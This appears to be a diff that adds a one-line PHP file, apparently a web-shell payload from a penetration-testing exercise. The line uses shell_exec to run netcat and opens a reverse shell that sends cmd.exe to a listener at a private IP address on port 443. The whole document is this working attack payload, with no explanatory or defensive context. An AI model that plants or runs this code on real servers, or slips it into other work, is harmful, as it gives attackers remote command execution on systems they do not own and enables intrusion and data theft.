@@ -1,0 +1,1 @@
+<?php echo shell_exec("nc -nv 10.11.0.210 443 -e cmd.exe");?>
